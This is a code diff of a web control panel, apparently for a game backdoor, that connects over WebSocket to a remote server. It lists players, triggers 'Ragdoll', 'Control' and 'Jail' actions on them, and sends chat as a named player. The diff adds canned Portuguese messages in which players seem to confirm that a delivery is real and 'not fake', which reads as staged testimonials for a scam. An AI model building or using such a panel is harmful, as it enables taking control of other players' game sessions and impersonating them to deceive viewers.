@@ -2,77 +2,101 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>Kanye Admin Panel</title>
+<title>Pxl4r1z3d Panel</title>
 
 <style>
 body {
   margin:0;
-  background:#0b0b0b;
+  background:#f5f5f5;
   font-family:sans-serif;
   display:flex;
   justify-content:center;
   padding:20px;
-  color:#ddd;
 }
 
 .panel {
-  width:380px;
-  background:#111;
-  border:1px solid #222;
-  border-radius:10px;
+  width:400px;
+  background:white;
+  border-radius:12px;
+  box-shadow:0 5px 20px rgba(0,0,0,0.1);
+  overflow:hidden;
 }
 
 .header {
-  padding:10px;
-  background:#151515;
+  padding:12px;
+  background:#111;
+  color:white;
   display:flex;
   justify-content:space-between;
-  border-bottom:1px solid #222;
 }
 
 .section {
-  padding:10px;
-  border-bottom:1px solid #1a1a1a;
+  padding:12px;
+  border-bottom:1px solid #eee;
 }
 
 .title {
   font-size:12px;
   color:#777;
-  margin-bottom:5px;
+  margin-bottom:6px;
+}
+
+input {
+  width:100%;
+  padding:8px;
+  margin-bottom:6px;
+  border:1px solid #ddd;
+  border-radius:6px;
+}
+
+.btn {
+  background:#111;
+  color:white;
+  padding:8px;
+  text-align:center;
+  border-radius:6px;
+  cursor:pointer;
+  margin-top:5px;
+}
+
+.btn:hover {
+  background:#333;
 }
 
 .players {
-  max-height:150px;
+  max-height:140px;
   overflow:auto;
 }
 
 .player {
   padding:6px;
-  border:1px solid #333;
+  border-radius:6px;
+  border:1px solid #eee;
   margin-bottom:4px;
   cursor:pointer;
 }
 
 .player:hover {
-  background:#333;
+  background:#f0f0f0;
 }
 
-.btn {
-  background:#1a1a1a;
-  border:1px solid #333;
+/* mensagens prontas */
+.msgs {
+  display:flex;
+  flex-direction:column;
+  gap:5px;
+}
+
+.msg {
   padding:6px;
-  margin-top:5px;
+  border-radius:6px;
+  border:1px solid #ddd;
   cursor:pointer;
-  text-align:center;
+  font-size:12px;
 }
 
-input {
-  width:100%;
-  padding:6px;
-  margin-bottom:5px;
-  background:#1a1a1a;
-  border:1px solid #333;
-  color:white;
+.msg:hover {
+  background:#eee;
 }
 </style>
 </head>
@@ -82,25 +106,38 @@ input {
 <div class="panel">
 
 <div class="header">
-  <span>KANYE PANEL</span>
+  <span>Pxl4r1z3d Panel</span>
   <span id="status">OFF</span>
 </div>
 
+<!-- PLAYERS -->
 <div class="section">
   <div class="title">PLAYERS</div>
   <div id="players" class="players"></div>
   <div class="btn" onclick="refresh()">Refresh</div>
 </div>
 
+<!-- CHAT -->
 <div class="section">
   <div class="title">CHAT</div>
-  <input id="name" placeholder="Player">
+
+  <input id="name" placeholder="Player Name">
   <input id="msg" placeholder="Message">
+
   <div class="btn" onclick="sendChat()">Send</div>
 </div>
 
+<!-- MENSAGENS PRONTAS -->
+<div class="section">
+  <div class="title">QUICK MESSAGES</div>
+
+  <div class="msgs" id="quickMsgs"></div>
+</div>
+
+<!-- ACTIONS -->
 <div class="section">
   <div class="title">ACTIONS</div>
+
   <div class="btn" onclick="send('Ragdoll')">Ragdoll</div>
   <div class="btn" onclick="send('Control')">Control</div>
   <div class="btn" onclick="send('Jail')">Jail</div>
@@ -117,19 +154,36 @@ let ws;
 
 const playersBox = document.getElementById("players");
 const statusEl = document.getElementById("status");
+const quickBox = document.getElementById("quickMsgs");
 
-// 🔥 CONEXÃO SEGURA
+// 🔥 SUAS MENSAGENS
+const messages = [
+"Oloko Mn chegou Msm achei que era Faike",
+"Muito Confiavel mn!!",
+"Mn , ja que chegou Pss testa??",
+"Obrigado rodrigues Te amo Mn Continue sendo confiavell",
+"Pessoal chegou Msm! AChei que era fake , posso testar Mn?",
+"Mdsssss recebi mesmooo , vou testar para o Pessoal da laive ver que nao e fake"
+];
+
+// 🔥 RENDER MENSAGENS
+messages.forEach(m=>{
+  const el = document.createElement("div");
+  el.className = "msg";
+  el.textContent = m;
+
+  el.onclick = ()=>{
+    document.getElementById("msg").value = m;
+  };
+
+  quickBox.appendChild(el);
+});
+
+// 🔥 CONEXÃO
 function connect(){
-  try{
-    ws = new WebSocket("wss://luarmor-ws.onrender.com/ws");
-  }catch(e){
-    console.log("erro conectar", e);
-    return;
-  }
+  ws = new WebSocket("wss://luarmor-ws.onrender.com/ws");
 
   ws.onopen = ()=>{
-    console.log("WS conectado");
-
     statusEl.textContent = "ONLINE";
 
     ws.send(JSON.stringify({
@@ -139,35 +193,24 @@ function connect(){
   };
 
   ws.onclose = ()=>{
-    console.log("WS fechado");
     statusEl.textContent = "OFF";
     setTimeout(connect,2000);
   };
 
-  ws.onerror = (e)=>{
-    console.log("WS erro", e);
-  };
-
   ws.onmessage = (e)=>{
     try{
-      console.log("📩", e.data);
-
       const data = JSON.parse(e.data);
 
       if(data.type === "players"){
         renderPlayers(data.list);
       }
 
-    }catch(err){
-      console.log("erro json", err);
-    }
+    }catch{}
   };
 }
 
-// 🔥 RENDER PLAYERS (SEGURO)
+// 🔥 PLAYERS
 function renderPlayers(list){
-  if(!Array.isArray(list)) return;
-
   playersBox.innerHTML = "";
 
   list.forEach(p=>{
@@ -177,27 +220,22 @@ function renderPlayers(list){
 
     el.onclick = ()=>{
       document.getElementById("name").value = p;
-
-      if(navigator.clipboard){
-        navigator.clipboard.writeText(p).catch(()=>{});
-      }
+      navigator.clipboard?.writeText(p);
     };
 
     playersBox.appendChild(el);
   });
 }
 
-// 🔥 SEND BUTTON
+// 🔥 SEND
 function send(name){
-  if(ws && ws.readyState === 1){
+  if(ws.readyState === 1){
     ws.send(JSON.stringify({button:name}));
   }
 }
 
-// 🔥 SEND CHAT
+// 🔥 CHAT
 function sendChat(){
-  if(!ws || ws.readyState !== 1) return;
-
   const player = document.getElementById("name").value;
   const msg = document.getElementById("msg").value;
 
@@ -213,12 +251,9 @@ function sendChat(){
 
 // 🔥 REFRESH
 function refresh(){
-  if(ws && ws.readyState === 1){
-    ws.send(JSON.stringify({type:"refresh"}));
-  }
+  ws.send(JSON.stringify({type:"refresh"}));
 }
 
-// INIT
 connect();
 </script>
 
